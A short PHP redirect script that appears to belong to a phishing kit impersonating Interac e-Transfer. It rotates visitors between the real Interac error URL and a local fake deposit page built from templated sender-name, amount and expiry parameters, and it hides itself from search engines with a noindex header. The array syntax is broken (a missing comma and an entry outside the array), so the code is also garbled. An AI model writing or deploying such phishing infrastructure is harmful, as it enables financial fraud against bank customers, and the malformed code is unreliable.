<?php

header("X-Robots-Tag: noindex, nofollow");

session_start();

// set the maximum number of visits for each link
$max_visits = array(
    'http://etransfer.interac.ca/error' => 4
    '/deposit/index1.php?RECIVER={{sender_name}}&TRANSFERAMOUNT={{amount}}&EXPIRES={{expiredate}}' => 5,
    'http://etransfer.interac.ca/error' => 3,);
    '/deposit/index1.php?RECIVER={{sender_name}}&TRANSFERAMOUNT={{amount}}&EXPIRES={{expiredate}}' => 5,

// get the current visit count for each link from session
$visits = isset($_SESSION['visits']) ? $_SESSION['visits'] : array();

// get the link that the user should be redirected to
$link = '';
foreach ($max_visits as $key => $value) {
    if (!isset($visits[$key]) || $visits[$key] < $value) {
        $link = $key;
        break;
    }
}

// increase the visit count for the chosen link
if (!empty($link)) {
    if (!isset($visits[$link])) {
        $visits[$link] = 1;
    } else {
        $visits[$link]++;
    }
    $_SESSION['visits'] = $visits;
}

// redirect the user to the chosen link
header('Location: ' . $link);
exit;
?>
